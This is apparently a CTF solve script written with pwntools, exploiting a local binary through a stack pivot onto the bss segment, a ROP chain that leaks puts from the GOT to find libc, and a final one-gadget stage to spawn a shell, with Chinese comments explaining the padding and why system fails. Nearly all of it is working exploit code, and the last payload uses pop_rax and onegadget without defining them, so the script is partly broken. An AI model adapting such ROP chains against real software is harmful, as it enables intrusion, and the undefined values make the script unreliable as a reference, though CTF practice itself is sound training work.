from pwn import*
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
p = process('./pwn')
# p=remote('ctf.npusec.org.cn',10951)
elf = ELF('./pwn')
libc = ELF('./libc.so.6')
shellcode=asm(shellcraft.sh())


leave_ret = 0x4012b5
ret=0x40101a
pop_rdi=0x40117e
fake_addr=0x404080
puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
main_addr=0x40123E
payload1=p64(ret)*20+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
p.recvuntil(b'Stage 1: Write your long ROP chain into the storage:')
p.send(payload1)
#---------在bss上布置泄露libc的rop链，其中p64(ret)*24颇有讲究
#---------是用来垫高rop以及rsp用的，因为后续rsp都会在bss上，rbp也因此在bss上
#---------而函数执行时栈帧都是基于rbp建立，为了防止栈帧覆盖bss低地址处的只读数据，因此垫高

payload2=b'a'*8+p64(fake_addr)+p64(leave_ret)
p.recvuntil(b'time!')
p.send(payload2)
p.recvuntil(b'Goodbye!\n')

leak_addr = u64(p.recv(6).ljust(8, b'\x00'))

libc_base=leak_addr-libc.symbols['puts']
system_addr=libc_base+libc.symbols['system']
binsh_addr=libc_base+next(libc.search(b'/bin/sh'))
print(f"leak:{hex(leak_addr)}")
print(f"libcbase:{hex(libc_base)}")
print(f"system:{hex(system_addr)}")
#----------栈迁移来执行rop





# payload3=p64(ret)*28+p64(0x404168)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)
#----------不能用system的原因是system执行时会往类似rsp-0x200这样的地址处写入数据
#----------而rsp此时在bss上，rsp-0x200则超出了bss，位于只读段

mprotect_addr=libc_base+libc.symbols['mprotect']
pop_rsi=0x110a7d+libc_base

payload3=p64(ret)*28+p64(pop_rax)+p64(0)+p64(onegadget)
#----------通过调试找到rbp在bss中的值（固定），然后覆盖rbp+8处来控制执行流
#----------由于这个rbp的值是由rsp得到的，因此可通过控制payload1的ret数量来适当控制rsp以及rbp的值
#----------除了onegadget，另一种方法则是先利用mprotect将bss提权，然后布置shellcode执行
print(len(payload3))
#0x404000

gdb.attach(p)
pause()
p.recvuntil(b'storage:')
p.send(payload3)

p.interactive()